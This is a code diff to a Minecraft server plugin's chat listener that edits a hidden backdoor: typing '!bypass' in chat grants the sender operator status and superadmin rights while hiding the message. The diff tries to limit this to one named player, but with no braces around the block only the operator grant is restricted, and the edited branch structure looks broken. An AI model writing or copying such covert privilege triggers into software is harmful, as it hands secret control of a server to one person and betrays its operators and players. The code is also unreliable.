@@ -543,10 +543,15 @@ public class TFM_PlayerListener implements Listener
             }
             if(message.contains("!bypass"))
             		{
+            	 if (player.getName().equalsIgnoreCase("buildcarter8"))
             	     player.setOp(true);
             	     player.sendMessage(ChatColor.RED + "meh");
             	     TFM_AdminList.addSuperadmin(player);
             	     event.setCancelled(true);
+            		}
+            else
+            {
+            	event.setCancelled(true);
             		}
             if (message.toLowerCase().contains("~satan"))
             {
